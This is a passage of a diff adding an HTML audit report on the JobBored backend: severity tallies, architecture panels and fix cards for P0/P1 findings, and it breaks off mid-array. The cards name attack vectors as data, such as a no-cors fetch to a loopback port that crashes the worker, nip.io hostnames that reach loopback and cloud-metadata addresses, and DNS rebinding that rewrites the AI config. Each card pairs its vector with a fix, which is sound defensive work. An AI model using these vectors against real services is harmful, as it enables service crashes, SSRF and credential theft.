@@ -1,0 +1,542 @@
+<title>JobBored Backend Audit</title>
+<meta name="description" content="BEAUDIT 2026-09-25: current vs target backend architecture, every P0/P1 fix, contract changes, backend-enabled features and the build roadmap for JobBored.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Caveat:wght@600;700&family=Geist:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap">
+<style>
+:root{
+  --bg:#FBF7EE; --surface:#FFFEF9; --surface-2:#F4EEDF; --ink:#1B2B33; --ink-2:#3A5566; --ink-3:#5E7684;
+  --line:#E5DFCC; --line-strong:#C9C2B0; --navy:#0E3A4E; --navy-soft:#E3ECF0;
+  --mint:#2F8A5A; --mint-soft:#DCF1E2; --amber:#A65F0E; --amber-bright:#EF8F26; --amber-soft:#FAE2C2;
+  --rose:#B03224; --rose-soft:#F6DAD6; --violet:#6D32D6; --violet-soft:#E8DEF7; --tape:#FCEFA8;
+  --shadow-card:2px 3px 0 rgba(14,58,78,.08),0 0 0 1px rgba(14,58,78,.10);
+  --shadow-sticker:3px 4px 0 rgba(14,58,78,.12);
+  --focus:0 0 0 3px rgba(89,203,137,.45);
+  --f-display:"Caveat","Bradley Hand",cursive;
+  --f-body:"Geist",-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,sans-serif;
+  --f-mono:"JetBrains Mono",ui-monospace,"SF Mono",Menlo,monospace;
+  color-scheme:light;
+}
+@media (prefers-color-scheme:dark){
+  :root:not([data-theme="light"]){
+    --bg:#0F171C; --surface:#16222A; --surface-2:#1C2B34; --ink:#E6EDF0; --ink-2:#B8C7CF; --ink-3:#8BA0AC;
+    --line:#2A3A44; --line-strong:#3D515D; --navy:#A9D1E3; --navy-soft:#1B3441;
+    --mint:#74D9A0; --mint-soft:#1B3A2A; --amber:#F2A65A; --amber-bright:#F2A65A; --amber-soft:#3B2A15;
+    --rose:#F28B7F; --rose-soft:#3E2220; --violet:#B89CF5; --violet-soft:#2C2342; --tape:#5B5323;
+    --shadow-card:0 0 0 1px rgba(255,255,255,.06),2px 3px 0 rgba(0,0,0,.35);
+    --shadow-sticker:3px 4px 0 rgba(0,0,0,.4);
+    color-scheme:dark;
+  }
+}
+:root[data-theme="dark"]{
+  --bg:#0F171C; --surface:#16222A; --surface-2:#1C2B34; --ink:#E6EDF0; --ink-2:#B8C7CF; --ink-3:#8BA0AC;
+  --line:#2A3A44; --line-strong:#3D515D; --navy:#A9D1E3; --navy-soft:#1B3441;
+  --mint:#74D9A0; --mint-soft:#1B3A2A; --amber:#F2A65A; --amber-bright:#F2A65A; --amber-soft:#3B2A15;
+  --rose:#F28B7F; --rose-soft:#3E2220; --violet:#B89CF5; --violet-soft:#2C2342; --tape:#5B5323;
+  --shadow-card:0 0 0 1px rgba(255,255,255,.06),2px 3px 0 rgba(0,0,0,.35);
+  --shadow-sticker:3px 4px 0 rgba(0,0,0,.4);
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:15px;line-height:1.55;-webkit-font-smoothing:antialiased}
+.wrap{max-width:1180px;margin:0 auto;padding-inline:16px;padding-block:20px 64px}
+code,.mono{font-family:var(--f-mono);font-size:.86em}
+h1,h2,h3{text-wrap:balance;margin:0}
+a{color:var(--navy)}
+/* header */
+.mast{display:grid;grid-template-columns:1fr auto;gap:12px 24px;align-items:end;border-bottom:2px solid var(--line-strong);padding-bottom:14px}
+.mast h1{font-family:var(--f-display);font-weight:700;font-size:clamp(2.2rem,1.6rem + 2.4vw,3.2rem);line-height:1;color:var(--navy)}
+.mast .sub{color:var(--ink-2);font-size:.95rem;max-width:62ch}
+.pin{font-family:var(--f-mono);font-size:.78rem;color:var(--ink-3);text-align:right;white-space:nowrap}
+.tally{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px}
+.chip{display:inline-flex;align-items:center;gap:6px;border-radius:999px;padding:3px 10px;font-size:.78rem;font-weight:600;border:1px solid var(--line-strong);background:var(--surface);color:var(--ink-2);font-variant-numeric:tabular-nums}
+.chip b{color:var(--ink)}
+.sev-P0{background:var(--rose);color:#fff;border-color:transparent}
+.sev-P1{background:var(--amber-soft);color:var(--amber);border-color:transparent}
+.sev-P2{background:var(--navy-soft);color:var(--navy);border-color:transparent}
+.sowhat{margin:18px 0 6px;display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:10px;padding:0;list-style:none}
+.sowhat li{background:var(--surface);box-shadow:var(--shadow-card);border-radius:12px;padding:12px 14px;font-size:.88rem;color:var(--ink-2)}
+.sowhat li strong{display:block;color:var(--ink);font-size:.95rem;margin-bottom:4px;line-height:1.3}
+/* tabs */
+.tabs{position:sticky;top:env(safe-area-inset-top,0px);z-index:5;background:var(--bg);display:flex;gap:4px;overflow-x:auto;margin:18px 0 0;padding:8px 0;border-bottom:1px solid var(--line)}
+.tab{appearance:none;border:1px solid transparent;background:transparent;color:var(--ink-2);font:600 .9rem var(--f-body);padding:8px 14px;border-radius:10px;cursor:pointer;white-space:nowrap}
+.tab:hover{background:var(--surface-2)}
+.tab[aria-selected="true"]{background:var(--surface);color:var(--navy);border-color:var(--line-strong);box-shadow:var(--shadow-card)}
+.tab:focus-visible,.fbtn:focus-visible{outline:none;box-shadow:var(--focus)}
+.panel{padding-top:22px}
+.panel>header{display:flex;flex-wrap:wrap;align-items:baseline;gap:8px 16px;margin-bottom:14px}
+.panel>header h2{font-family:var(--f-display);font-size:2rem;color:var(--navy);line-height:1}
+.panel>header p{margin:0;color:var(--ink-2);max-width:70ch;font-size:.92rem}
+/* diagrams */
+.diag-grid{display:grid;grid-template-columns:1fr;gap:16px}
+.diag{background:var(--surface);border-radius:14px;box-shadow:var(--shadow-card);padding:12px 12px 8px}
+.diag h3{font-size:.95rem;margin:2px 4px 8px;display:flex;gap:8px;align-items:center}
+.scroll{overflow-x:auto}
+.diag svg{display:block;width:100%;max-width:980px;margin:0 auto;min-width:560px;height:auto}
+.legend{display:flex;flex-wrap:wrap;gap:12px;font-size:.8rem;color:var(--ink-2);margin:10px 4px 2px}
+.sw{display:inline-block;width:14px;height:10px;border-radius:3px;vertical-align:-1px;margin-right:5px;border:1.5px solid var(--line-strong);background:var(--surface-2)}
+.sw.new{border-color:var(--mint);background:var(--mint-soft)}
+.sw.chg{border-color:var(--amber-bright);background:var(--amber-soft)}
+.sw.risk{border-color:var(--rose);background:var(--rose-soft)}
+.moves{margin-top:16px;display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:10px}
+.move{background:var(--surface);border-radius:12px;padding:12px 14px;box-shadow:var(--shadow-card);font-size:.87rem;color:var(--ink-2)}
+.move b{color:var(--ink);display:block;margin-bottom:2px}
+/* fixes */
+.filters{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px}
+.fbtn{appearance:none;border:1px solid var(--line-strong);background:var(--surface);color:var(--ink-2);font:600 .8rem var(--f-body);padding:5px 11px;border-radius:999px;cursor:pointer}
+.fbtn[aria-pressed="true"]{background:var(--navy);color:var(--surface);border-color:var(--navy)}
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:12px}
+.card{background:var(--surface);border-radius:12px;box-shadow:var(--shadow-card);padding:12px 14px 12px 18px;position:relative;display:flex;flex-direction:column;gap:8px}
+.card::before{content:"";position:absolute;left:0;top:10px;bottom:10px;width:5px;border-radius:0 4px 4px 0;background:var(--amber-bright)}
+.card.P0::before{background:var(--rose)}
+.card .top{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
+.card .id{font-family:var(--f-mono);font-weight:600;font-size:.9rem;color:var(--ink)}
+.card .merged{font-family:var(--f-mono);font-size:.74rem;color:var(--ink-3)}
+.card .theme{margin-left:auto;font-size:.74rem;color:var(--ink-3)}
+.step{display:grid;grid-template-columns:78px 1fr;gap:8px;font-size:.85rem;align-items:start}
+.step>span{font-size:.68rem;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-3);font-weight:700;padding-top:2px}
+.step p{margin:0;color:var(--ink-2)}
+.step .locs{display:flex;flex-wrap:wrap;gap:4px}
+.loc{font-family:var(--f-mono);font-size:.74rem;background:var(--surface-2);border:1px solid var(--line);border-radius:6px;padding:1px 6px;color:var(--ink);overflow-wrap:anywhere}
+.claim{display:-webkit-box;-webkit-line-clamp:4;-webkit-box-orient:vertical;overflow:hidden}
+.card.open .claim{-webkit-line-clamp:unset;display:block}
+.more{appearance:none;border:0;background:none;color:var(--navy);font:600 .78rem var(--f-body);padding:0;cursor:pointer;justify-self:start}
+.foot{display:flex;flex-wrap:wrap;gap:6px;font-size:.74rem}
+.ok{background:var(--mint-soft);color:var(--mint);border-color:transparent}
+.warn{background:var(--amber-soft);color:var(--amber);border-color:transparent}
+/* contracts */
+.contract{background:var(--surface);border-radius:14px;box-shadow:var(--shadow-card);padding:14px;margin-bottom:14px}
+.contract h3{font-size:1rem;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.contract .why{color:var(--ink-2);font-size:.87rem;margin:6px 0 10px;max-width:80ch}
+.ba{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.ba>div{min-width:0}
+.ba h4{margin:0 0 4px;font-size:.72rem;letter-spacing:.06em;text-transform:uppercase;color:var(--ink-3)}
+pre{margin:0;background:var(--surface-2);border:1px solid var(--line);border-radius:10px;padding:10px 12px;font-family:var(--f-mono);font-size:.76rem;line-height:1.5;overflow-x:auto;color:var(--ink)}
+.after pre{border-color:var(--mint);background:color-mix(in srgb,var(--mint-soft) 55%,var(--surface))}
+.ver{font-family:var(--f-mono);font-size:.74rem}
+.kind-breaking{background:var(--rose-soft);color:var(--rose);border-color:transparent}
+.kind-additive{background:var(--mint-soft);color:var(--mint);border-color:transparent}
+.kind-new{background:var(--violet-soft);color:var(--violet);border-color:transparent}
+.kind-behavior{background:var(--amber-soft);color:var(--amber);border-color:transparent}
+/* features */
+.feat{display:grid;grid-template-columns:minmax(0,1.05fr) minmax(0,1fr);gap:16px;background:var(--surface);border-radius:16px;box-shadow:var(--shadow-card);padding:16px;margin-bottom:18px}
+.feat .meta{display:flex;flex-direction:column;gap:10px;min-width:0}
+.feat h3{font-size:1.1rem}
+.feat .value{margin:0;color:var(--ink-2);font-size:.9rem}
+.feat .seq svg{width:100%;min-width:520px;height:auto;display:block}
+.mockframe{background:var(--bg);border:1.5px dashed var(--line-strong);border-radius:14px;padding:14px;position:relative;min-width:0}
+.mockframe .tape{position:absolute;top:-10px;left:18px;background:var(--tape);color:var(--ink);font:600 .7rem var(--f-body);padding:2px 10px;transform:rotate(-2deg);box-shadow:var(--shadow-sticker)}
+.jbcard{background:var(--surface);border-radius:12px;box-shadow:var(--shadow-card);padding:12px 14px}
+.jbh{font-family:var(--f-display);font-size:1.5rem;color:var(--navy);line-height:1;margin-bottom:6px}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:4px 12px;font-size:.84rem}
+.kv dt{color:var(--ink-3)}
+.kv dd{margin:0;color:var(--ink)}
+.btnrow{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px}
+.jbbtn{border-radius:999px;padding:6px 14px;font:600 .82rem var(--f-body);border:1.5px solid var(--navy);background:var(--navy);color:var(--surface)}
+.jbbtn.ghost{background:transparent;color:var(--navy)}
+.notice{border-radius:10px;padding:8px 10px;font-size:.8rem;background:var(--amber-soft);color:var(--amber);margin-top:8px}
+.notice.ok{background:var(--mint-soft);color:var(--mint)}
+.tl{list-style:none;margin:6px 0 0;padding:0 0 0 14px;border-left:2px solid var(--line-strong);display:flex;flex-direction:column;gap:8px;font-size:.84rem}
+.tl li{position:relative}
+.tl li::before{content:"";position:absolute;left:-20px;top:6px;width:10px;height:10px;border-radius:50%;background:var(--surface);border:2px solid var(--stage,var(--ink-3))}
+.tl time{font-family:var(--f-mono);font-size:.74rem;color:var(--ink-3);margin-right:6px}
+.stage{display:inline-block;border-radius:999px;padding:0 8px;font-size:.72rem;font-weight:700;color:#fff;background:var(--stage)}
+.rows{width:100%;border-collapse:collapse;font-size:.8rem}
+.rows th,.rows td{text-align:left;padding:5px 6px;border-bottom:1px solid var(--line)}
+.rows th{color:var(--ink-3);font-weight:600;font-size:.72rem;text-transform:uppercase;letter-spacing:.04em}
+.num{font-variant-numeric:tabular-nums;text-align:right!important}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px;vertical-align:1px}
+.d-ok{background:var(--mint)}.d-warn{background:var(--amber-bright)}.d-bad{background:var(--rose)}
+/* roadmap */
+.waves{display:grid;grid-template-columns:repeat(4,minmax(220px,1fr));gap:12px;overflow-x:auto;padding-bottom:6px}
+.wave h3{font-size:.8rem;text-transform:uppercase;letter-spacing:.06em;color:var(--ink-3);margin:0 0 8px}
+.lane{background:var(--surface);border-radius:12px;box-shadow:var(--shadow-card);padding:10px 12px;margin-bottom:10px;font-size:.84rem}
+.lane .lh{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
+.lane .letter{font-family:var(--f-display);font-size:1.6rem;line-height:1;color:var(--navy);min-width:20px}
+.lane .claims{font-family:var(--f-mono);font-size:.72rem;color:var(--ink-3);margin-top:4px;overflow-wrap:anywhere}
+.lane .after{font-size:.74rem;color:var(--amber);margin-top:3px}
+.fam-sol{background:var(--navy-soft);color:var(--navy);border-color:transparent}
+.fam-opus{background:var(--violet-soft);color:var(--violet);border-color:transparent}
+.fam-gemini{background:var(--mint-soft);color:var(--mint);border-color:transparent}
+.note{font-size:.84rem;color:var(--ink-2);margin-top:12px}
+@media (max-width:820px){
+  .diag-grid,.ba,.feat,.moves{grid-template-columns:1fr}
+  .mast{grid-template-columns:1fr}
+  .pin{text-align:left}
+  .cards{grid-template-columns:1fr}
+}
+@media (prefers-reduced-motion:no-preference){.card,.tab{transition:box-shadow .15s ease,background .15s ease}}
+</style>
+
+<div class="wrap">
+  <header class="mast">
+    <div>
+      <h1>JobBored Backend Audit</h1>
+      <p class="sub">Eight audit lanes read every backend surface at one pinned commit, probed each claim on loopback, and had Muse re-run every reproducer. This page shows where the backend stands, what to fix first, the contracts that change, and the features the fixes make cheap.</p>
+    </div>
+    <div class="pin">BEAUDIT · 2026-09-25<br>origin/main f227fbb<br>186 lane rows → 163 root causes</div>
+  </header>
+  <div class="tally" aria-label="Finding counts">
+    <span class="chip sev-P0"><b style="color:inherit">4</b> P0</span>
+    <span class="chip sev-P1"><b style="color:inherit">35</b> P1</span>
+    <span class="chip sev-P2"><b style="color:inherit">65</b> P2</span>
+    <span class="chip"><b>31</b> P3</span>
+    <span class="chip"><b>28</b> features</span>
+    <span class="chip ok"><b style="color:inherit">240/241</b> reproducer checks passed · 1 unclear · 0 failed</span>
+  </div>
+  <ul class="sowhat">
+    <li><strong>Four P0 holes, all reproduced</strong>DNS rebinding rewrites llm.json and the profile; the relay spends the worker secret for anyone; <code>GET //</code> kills the worker; three fetch paths skip the SSRF guard.</li>
+    <li><strong>The OSS build ships Emilio as every user</strong>Materials tailor his resume, the apply filler answers with his identity, and a profile save rewrites a tracked file.</li>
+    <li><strong>The Sheet has no concurrency control</strong>Stale row numbers and no lock: duplicate rows, another job overwritten, user columns replaced, formulas injected.</li>
+    <li><strong>Discovery drops its best leads</strong>A unit bug sorts leads alphabetically, an 18-slot cap truncates silently, and three "fixed" prior defects are fixed only in unused helpers.</li>
+    <li><strong>Most of the prior audit is still open</strong>22 of 52 backend claims fixed, 0 of 23 backend wishlist items built, hosted mode broken, 7 AI clients.</li>
+  </ul>
+
+  <nav class="tabs" role="tablist" aria-label="Sections">
+    <button class="tab" role="tab" id="t-now" aria-controls="now" aria-selected="true">Now → Next</button>
+    <button class="tab" role="tab" id="t-fixes" aria-controls="fixes" aria-selected="false">Fixes</button>
+    <button class="tab" role="tab" id="t-contracts" aria-controls="contracts" aria-selected="false">Contracts</button>
+    <button class="tab" role="tab" id="t-features" aria-controls="features" aria-selected="false">Features</button>
+    <button class="tab" role="tab" id="t-roadmap" aria-controls="roadmap" aria-selected="false">Roadmap</button>
+  </nav>
+
+  <section class="panel" id="now" role="tabpanel" aria-labelledby="t-now">
+    <header><h2>Now → Next</h2><p>Every arrow is a real call path at f227fbb. Rose badges mark confirmed P0/P1 root causes. On the right, amber nodes change and mint nodes are new single funnels that replace today's duplicates.</p></header>
+    <div class="diag-grid">
+      <div class="diag"><h3><span class="chip sev-P0">Now</span> f227fbb</h3><div class="scroll" id="svg-now"></div></div>
+      <div class="diag"><h3><span class="chip ok">Next</span> after waves 0–2</h3><div class="scroll" id="svg-next"></div></div>
+    </div>
+    <div class="legend"><span><i class="sw"></i>unchanged</span><span><i class="sw risk"></i>open P0/P1 root cause</span><span><i class="sw chg"></i>changed</span><span><i class="sw new"></i>new single funnel</span></div>
+    <div class="moves" id="moves"></div>
+  </section>
+
+  <section class="panel" id="fixes" role="tabpanel" aria-labelledby="t-fixes" hidden>
+    <header><h2>Fixes</h2><p>One card per P0/P1 root cause: the symptom, the code that causes it at f227fbb, the fix, and the probe that turns into its regression test. Muse's verdict is on every card.</p></header>
+    <div class="filters" id="filters" role="group" aria-label="Filter fixes"></div>
+    <div class="cards" id="cards"></div>
+  </section>
+
+  <section class="panel" id="contracts" role="tabpanel" aria-labelledby="t-contracts" hidden>
+    <header><h2>Contracts</h2><p>Before and after request and response shapes for every changed or new endpoint. Each change follows the AGENTS.md invariant: schema, examples, <code>AGENT_CONTRACT.md</code> and <code>docs/CONTRACT-CHANGELOG.md</code> move together.</p></header>
+    <div id="contract-list"></div>
+  </section>
+
+  <section class="panel" id="features" role="tabpanel" aria-labelledby="t-features" hidden>
+    <header><h2>Features</h2><p>Backend-enabled features the fixes make cheap, ranked by job-hunter value ÷ effort. Each has a sequence, an API sketch and a static mock of where it lands in the app, drawn with JobBored's own tokens.</p></header>
+    <div id="feature-list"></div>
+  </section>
+
+  <section class="panel" id="roadmap" role="tabpanel" aria-labelledby="t-roadmap" hidden>
+    <header><h2>Roadmap</h2><p>The §8 build program. Sol builds backend, Opus builds browser surfaces, Gemini does bulk edits and docs; Muse verifies every lane and Grok reviews every diff. Arrows are the serial edges.</p></header>
+    <div class="diag"><div class="scroll" id="svg-roadmap"></div></div>
+    <div class="waves" id="waves" style="margin-top:16px"></div>
+    <p class="note">Every lane runs the floor <code>npm run lint:repo && npm run typecheck:repo && npm test && npm run test:browser-use-discovery && npm run test:contract:all</code>, plus its probes promoted to tests. Browser lanes add <code>test:e2e-smoke</code> and <code>test:e2e-journey</code>. Lane H adds the Hermes pytest job.</p>
+  </section>
+</div>
+
+<script>
+const CARDS = [{"id": "A1", "ids": ["A1"], "lane": "A", "theme": "Worker ingress", "sev": "P0", "status": "CONFIRMED", "claim": "One unauthenticated `GET //` (or `//x`) terminates the worker process. `new URL(request.url, base)` throws `ERR_INVALID_URL` outside any try, and the async `createServer` callback turns it into an unhandled rejection. This runs before the origin guard and the secret check, so any caller that can reach the port can do it: a tunnel, the LAN when the host is 0.0.0.0, or a web page's no-cors `fetch(\"http://127.0.0.1:8644//\")` (the browser vector is INFERRED). Every in-flight run dies and is marked failed on the next boot.", "loc": ["W/server.ts:1016-1022", "sec05-raw-paths.mjs", "repro-a1-crash.sh"], "fix": "Parse the URL in a try that returns 400, and wrap the whole request callback in a catch-all that answers 500 and never rethrows; add a router test that sends `//`. The open PR #111 (respawn a dead reused `:8644` worker in `scripts/start-discovery-worker-local.mjs`) limits the downtime but does not fix the crash or save in-flight runs.", "effort": "S", "build": "sol", "probes": ["sec05-raw-paths.mjs"], "verify": "A1: REPRODUCED"}, {"id": "C1", "ids": ["C1", "C2", "D15"], "lane": "C", "theme": "Sources and SSRF", "sev": "P0", "status": "CONFIRMED", "claim": "Three outbound fetch paths bypass the DNS-pinned SSRF primitive: worker page visits through `sessionManager.run` (raw `fetch`, redirects followed; `127.0.0.1.nip.io` and `169.254.169.254.nip.io` classify as extractable), the default `agent-browser` command (any URL including cloud metadata), and expired-job cleanup (any Link in the Sheet, redirects followed). Response bodies land in listings or cleanup decisions.", "loc": ["W/browser/session.ts:151", "W/grounding/grounded-search.ts:1350", "W/discovery/career-surface-resolver.ts:294", "C-ssrf-session.mjs"], "fix": "Route `runFetchSession` through `W/net/safe-fetch.ts` (redirect-validated, DNS-pinned).", "effort": "S", "build": "sol", "probes": ["C-ssrf-session.mjs", "C-ssrf-browser-command.sh", "p14-cleanup-loopback-fetch.mjs"], "verify": "C1: REPRODUCED, C2: REPRODUCED, D15: REPRODUCED"}, {"id": "E1", "ids": ["E1", "G2"], "lane": "E", "theme": "API and AI layer", "sev": "P0", "status": "CONFIRMED", "claim": "Loopback listeners trust the attacker-controlled Host header, so a DNS-rebound web page (or a tailnet peer behind `tailscale serve`) can read and rewrite `~/.jobbored/llm.json` through `:3847` (re-pointing every AI call, with the user's resume, at an attacker base URL) and read and overwrite the profile through the `:8080` `/profile` proxy.", "loc": ["security-boundaries.mjs:94-95", "index.mjs:87-88", "llm-config.mjs:305-316", "probes/probe-e-cors.sh"], "fix": "On loopback listeners, reject any Host not in {127.0.0.1, localhost, [::1]}:PORT (403 `HOST_NOT_ALLOWED`), and stop deriving same-origin from Host unless an explicit origin list is set.", "effort": "S", "build": "sol", "probes": ["probe-e-cors.sh", "g-profile-rebind.sh"], "verify": "E1: REPRODUCED, G2: REPRODUCED"}, {"id": "G1", "ids": ["G1"], "lane": "G", "theme": "Local ops and relay", "sev": "P0", "status": "CONFIRMED", "claim": "The relay that `deploy-cloudflare-relay.mjs` ships is an open proxy: with FORWARD_SECRET unset (the documented dashboard path) any anonymous internet caller's POST to `/` or any `/<path>` reaches the local worker with DISCOVERY_SECRET injected, so the webhook secret authenticates nobody (paid discovery runs, Sheet writes, any POST route on the tunnel origin).", "loc": ["templates/cloudflare-worker/worker.js:60-78", "scripts/deploy-cloudflare-relay.mjs:34", "apps-script-relay-helpers.js:317", "g-relay-open-proxy.mjs"], "fix": "Require a caller credential before injecting (per-dashboard bearer minted at deploy and stored in the browser config, or an HMAC of body+timestamp), restrict upstream paths to /webhook and /runs/*, and reject when neither is present.", "effort": "M", "build": "sol", "probes": ["g-relay-open-proxy.mjs"], "verify": "G1: REPRODUCED"}, {"id": "B1", "ids": ["B1"], "lane": "B", "theme": "Discovery engine", "sev": "P1", "status": "CONFIRMED", "claim": "Frontier scoring multiplies the 1–10 `fitScore` by 100, so every lead with fit ≥3 saturates at composite 100 and a null fit becomes roleFit 5000. Exploit order then falls back to alphabetical `sortKey`, and fit-10 leads are dropped while fit-3 leads are kept. This is the worker half of PIPE-03.", "loc": ["W/run/frontier-scorer.ts:375-376", "W/run/run-discovery.ts:1090-1110"], "fix": "Convert once: `roleFit = fitScore==null ? 50 : clamp(fitScore*10,0,100)`, in one shared score-unit helper also used for the Match Score", "effort": "S", "build": "sol", "probes": ["B-frontier-saturation"], "verify": "B1: REPRODUCED"}, {"id": "B2", "ids": ["B2"], "lane": "B", "theme": "Discovery engine", "sev": "P1", "status": "CONFIRMED", "claim": "The 18-slot exploit budget is applied to ATS and SerpApi leads that are already extracted, normalized and LLM-scored. Accepted leads past 18 are silently dropped: no warning, state `completed`, and `maxLeadsPerRun`=50 is ignored.", "loc": ["run-discovery.ts:1106-1182", "frontier-scorer.ts:233-236"], "fix": "Apply the exploit budget only to un-extracted grounded scout candidates; let `selectLeadsForWrite` and `maxLeadsPerRun` cap writes; warn on any suppression", "effort": "S", "build": "sol", "probes": ["B-e2e-exploit-cap"], "verify": "B2: REPRODUCED"}, {"id": "B3", "ids": ["B3"], "lane": "B", "theme": "Discovery engine", "sev": "P1", "status": "CONFIRMED", "claim": "The exploit wrapper drops rejected candidates but keeps the scout's `rawText`. That fires Gemini prose recovery (Call 1.5), structuring (Call 2), preflight and Browser Use deep extraction on companies the frontier rejected, breaking the RUN-08 / VAL-LOOP-SCORE-005 invariant. With 25 rejected companies: 50 Gemini calls, 50 preflight fetches, 50 Browser Use runs, for 0 leads.", "loc": ["run-discovery.ts:206-224", "grounded-search.ts:1190-1195"], "fix": "In `wrapGroundedSearchClientForExploit`, return `rawText:\"\"`; skip `processSingleCompany` for companies with no selected URL", "effort": "S", "build": "sol", "probes": ["B-exploit-prose-bypass"], "verify": "B3: REPRODUCED"}, {"id": "B5", "ids": ["B5"], "lane": "B", "theme": "Discovery engine", "sev": "P1", "status": "IN-FLIGHT #113", "claim": "The `remote_only` pre-filter rejects every listing whose `remoteBucket` is unset, even when location says \"Remote\". All 25 were rejected, so the run ends as a zero-lead `partial`.", "loc": ["profile-aware-scorer.ts:53"], "fix": "#113 infers remote/hybrid/onsite from location/title/description before applying `remote_only`", "effort": "S", "build": "sol", "probes": ["B-llm-calls-per-run"], "verify": "B5: REPRODUCED"}, {"id": "C3", "ids": ["C3", "B14"], "lane": "C", "theme": "Sources and SSRF", "sev": "P1", "status": "CONFIRMED", "claim": "RUN-07 is still open on the production path. `runDiscovery` gates the whole ATS lane on `[\"greenhouse\",\"lever\",\"ashby\"]`, so an `ats_only` run with `[\"workday\",\"smartrecruiters\"]` makes 0 `detectBoards` calls. The registry-aware helper `hasRegisteredAtsExecutionLane` is called only by tests.", "loc": ["W/run/run-discovery.ts:470-473", "W/sources/ats-public-fetchers.ts:71", "C-run-ats-gating.mjs", "run-discovery.ts:470-473"], "fix": "Replace `:470-473` with `hasRegisteredAtsExecutionLane(config.effectiveSources, registry)`.", "effort": "S", "build": "sol", "probes": ["C-run-ats-gating.mjs"], "verify": "C3: REPRODUCED, B14: not run"}, {"id": "C4", "ids": ["C4"], "lane": "C", "theme": "Sources and SSRF", "sev": "P1", "status": "CONFIRMED", "claim": "RUN-10 is still open on the production path. `runDiscovery` lists boards with `Promise.all` and only swallows `TimeoutError`, so one throwing board discards its sibling's listings (0 leads written against 1 in the control). `collectListingsSettled` exists but `runDiscovery` never calls it.", "loc": ["W/run/run-discovery.ts:747-761", "W/browser/source-adapters.ts:58", "C-run-ats-gating.mjs"], "fix": "Use `collectBoardListingsSettled` at `:747` and push the attributed failures into `extractionResult.warnings`.", "effort": "S", "build": "sol", "probes": ["C-run-ats-gating.mjs"], "verify": "C4: REPRODUCED"}, {"id": "C5", "ids": ["C5", "B4"], "lane": "C", "theme": "Sources and SSRF", "sev": "P1", "status": "CONFIRMED", "claim": "Abort signals stop at the lane boundary: the ATS lane drops the `withTimeout` signal and the matcher/profile-scorer LLM calls get no signal or timeout, so one hung provider or board runs past `maxRunDurationMs` (still running at 8 s with a 1.5 s cap).", "loc": ["W/run/run-discovery.ts:753", "W/browser/providers/types.ts:46", "W/browser/providers/shared.ts:355", "W/browser/providers/index.ts:84"], "fix": "Thread `signal` through `SourceAdapter.listJobs`, `AtsProvider.enumerateListings`/`detectSurfaces`, `sessionManager.run` and `fetchWithTimeout`.", "effort": "M", "build": "sol", "probes": ["C-run-ats-gating.mjs", "B-hung-llm-outlives-run-cap"], "verify": "C5: REPRODUCED, B4: REPRODUCED"}, {"id": "C6", "ids": ["C6"], "lane": "C", "theme": "Sources and SSRF", "sev": "P1", "status": "CONFIRMED", "claim": "INGEST-01/04 are still open in the worker `/ingest-url`. The scraper returned company \"Acme Robotics\" and location \"Berlin\", but the Sheet row got company \"Careers\" (or \"Jobs\") and an empty location, with source label \"Company page\" even for a SerpApi-method result. `defaultScrapeJobPosting` passes only the URL, so the SerpApi fallback (which needs a title/company or `options.serpApiKey`) cannot fire.", "loc": ["W/webhook/handle-ingest-url.ts:974-978", "server/shared/job-scraper-core.mjs:280", "C-ingest-lineage.mjs"], "fix": "Use `scraped.company` (through `sanitizeInferredEmployer`) and `scraped.location` before host inference, label by `scraped.method`, and pass `{ serpApiKey: runtimeConfig.serpApiKey }`.", "effort": "S", "build": "sol", "probes": ["C-ingest-lineage.mjs"], "verify": "C6: REPRODUCED"}, {"id": "C15", "ids": ["C15", "B19"], "lane": "C", "theme": "Sources and SSRF", "sev": "P1", "status": "CONFIRMED", "claim": "Tests named for fixed claims pass while production is broken: `F4A-RUN07-REG` and `F4A-RUN10-SETTLED` test helpers `runDiscovery` never calls, frontier tests use a 0–1 fit scale while production uses 1–10, and LLM-trust tests inject a score cache production never wires.", "loc": ["W/../tests/sources/ats-public-fetchers.test.ts:156", "W/../tests/browser/source-adapters.test.ts:441", "C-run-ats-gating.mjs"], "fix": "Add `runDiscovery`-level tests (the probe is a ready template).", "effort": "S", "build": "sol", "probes": ["C-run-ats-gating.mjs"], "verify": "C15: REPRODUCED, B19: REPRODUCED"}, {"id": "D1", "ids": ["D1", "D8"], "lane": "D", "theme": "Sheet integrity", "sev": "P1", "status": "CONFIRMED", "claim": "Nothing serializes writes per Sheet: two concurrent writers append the same URL twice, and concurrent `/pipeline-update` note appends lose one note (read-modify-write).", "loc": ["W/sheets/pipeline-writer.ts:720-818", "p01-concurrent-append-dup.mjs", "W/sheets/pipeline-patcher.ts:96-102", "p09-pipeline-update-applied-and-note-race.mjs"], "fix": "Wrap read→write in a per-`sheetId` async mutex in the worker, and re-read `E2:E` immediately before the append to drop URLs added since the snapshot.", "effort": "S", "build": "sol", "probes": ["p01-concurrent-append-dup.mjs", "p09-pipeline-update-applied-and-note-race.mjs"], "verify": "D1: REPRODUCED, D8: REPRODUCED"}, {"id": "D2", "ids": ["D2", "D3", "F16"], "lane": "D", "theme": "Sheet integrity", "sev": "P1", "status": "CONFIRMED", "claim": "Every Sheet writer (worker merge, patcher, expired cleanup, rescore, browser, Hermes Applied write) addresses rows by a row number from a stale snapshot. A sort, insert or delete in between overwrites a different job; cleanup reverts a mid-pass Applied to Expired and replaces fresh Notes.", "loc": ["W/sheets/pipeline-writer.ts:574", "W/sheets/pipeline-patcher.ts:193-200", 